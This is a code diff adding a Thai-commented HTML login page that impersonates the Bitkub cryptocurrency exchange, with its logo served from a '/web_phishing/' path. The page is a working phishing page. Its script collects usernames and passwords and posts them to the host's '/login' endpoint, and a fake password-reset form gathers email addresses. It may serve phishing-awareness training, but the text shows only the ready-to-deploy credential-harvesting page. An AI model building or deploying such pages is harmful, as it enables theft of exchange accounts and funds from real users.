@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in to Bitkub</title>
+    <link rel="stylesheet" href="login.css">
+</head>
+<body>
+    <div class="logo"><img src="/web_phishing/logo.svg" alt="Bitkub" ></div>
+    
+    <div class="container">
+        <h1>Sign in to Bitkub</h1>
+        
+        <div id="message" class="message" style="display: none;"></div>
+        
+        <div class="auth-form">
+            <form id="login-form">
+                <div class="auth-form-header">
+                    <label for="login-field" class="label">Username or email address</label>
+                    <input type="text" name="login" id="login-field" class="form-control" autocomplete="username" autofocus>
+                </div>
+                
+                <div class="auth-form-header">
+                    <div class="password-header">
+                        <label for="password" class="label">Password</label>
+                        <a href="#" id="forgot-password-link" class="forgot-password">Forgot password?</a>
+                    </div>
+                    <input type="password" name="password" id="password" class="form-control" autocomplete="current-password">
+                </div>
+                
+                <button type="submit" class="btn btn-primary">Sign in</button>
+            </form>
+        </div>
+        
+        <div id="forgot-password-form" style="display: none;">
+            <h2>Reset your password</h2>
+            <div class="auth-form">
+                <form id="reset-form">
+                    <div class="auth-form-header">
+                        <label for="email-field" class="label">Email address</label>
+                        <input type="email" name="email" id="email-field" class="form-control" required>
+                    </div>
+                    <button type="submit" class="btn btn-primary">Send reset link</button>
+                    <button type="button" id="back-to-login" class="btn">Back to login</button>
+                </form>
+            </div>
+        </div>
+        
+        <div class="create-account-callout">
+            <p>New to Bitkub? <a href="register.html">Create an account</a>.</p>
+        </div>
+    </div>
+    
+    <div class="footer">
+        <div class="footer-links">
+            <a href="#">Terms</a>
+            <a href="#">Privacy</a>
+            <a href="#">Security</a>
+            <a href="#">Contact</a>
+        </div>
+        <p>© 2025 Bitkub, Inc.</p>
+    </div>
+    
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const loginForm = document.getElementById('login-form');
+            const resetForm = document.getElementById('reset-form');
+            const messageDiv = document.getElementById('message');
+            const forgotPasswordLink = document.getElementById('forgot-password-link');
+            const backToLoginBtn = document.getElementById('back-to-login');
+            const forgotPasswordForm = document.getElementById('forgot-password-form');
+            
+            // จัดการเมื่อกดปุ่มส่งข้อมูลล็อกอิน
+            loginForm.addEventListener('submit', async function(e) {
+                e.preventDefault();
+                
+                const loginField = document.getElementById('login-field').value;
+                const passwordField = document.getElementById('password').value;
+                
+                if (!loginField || !passwordField) {
+                    showMessage('กรุณากรอกชื่อผู้ใช้/อีเมลและรหัสผ่าน', 'error');
+                    return;
+                }
+                
+                try {
+                    const response = await fetch('/login', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            login: loginField,
+                            password: passwordField
+                        })
+                    });
+                    
+                    const data = await response.json();
+                    
+                    if (data.success) {
+                        showMessage(data.message, 'success');
+                        // รอสักครู่แล้วเปลี่ยนหน้า
+                        setTimeout(() => {
+                            window.location.href = data.redirect;
+                        }, 1000);
+                    } else {
+                        showMessage(data.message, 'error');
+                    }
+                } catch (error) {
+                    showMessage('เกิดข้อผิดพลาดในการเชื่อมต่อกับเซิร์ฟเวอร์', 'error');
+                    console.error('Error:', error);
+                }
+            });
+            
+            // จัดการเมื่อกดลิงก์ลืมรหัสผ่าน
+            forgotPasswordLink.addEventListener('click', function(e) {
+                e.preventDefault();
+                loginForm.style.display = 'none';
+                forgotPasswordForm.style.display = 'block';
+            });
+            
+            // กลับไปหน้าล็อกอิน
+            backToLoginBtn.addEventListener('click', function() {
+                forgotPasswordForm.style.display = 'none';
+                loginForm.style.display = 'block';
+                messageDiv.style.display = 'none';
+            });
+            
+            // จัดการเมื่อกดส่งฟอร์มลืมรหัสผ่าน
+            resetForm.addEventListener('submit', async function(e) {
+                e.preventDefault();
+                
+                const emailField = document.getElementById('email-field').value;
+                
+                if (!emailField) {
+                    showMessage('กรุณากรอกอีเมล', 'error');
+                    return;
+                }
+                
+                try {
+                    const response = await fetch('/forgot-password', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            email: emailField
+                        })
+                    });
+                    
+                    const data = await response.json();
+                    
+                    if (data.success) {
+                        showMessage(data.message, 'success');
+                    } else {
+                        showMessage(data.message, 'error');
+                    }
+                } catch (error) {
+                    showMessage('เกิดข้อผิดพลาดในการเชื่อมต่อกับเซิร์ฟเวอร์', 'error');
+                    console.error('Error:', error);
+                }
+            });
+            
+            // ฟังก์ชันแสดงข้อความ
+            function showMessage(message, type) {
+                messageDiv.textContent = message;
+                messageDiv.className = `message ${type}`;
+                messageDiv.style.display = 'block';
+            }
+        });
+    </script>
+</body>
+</html>
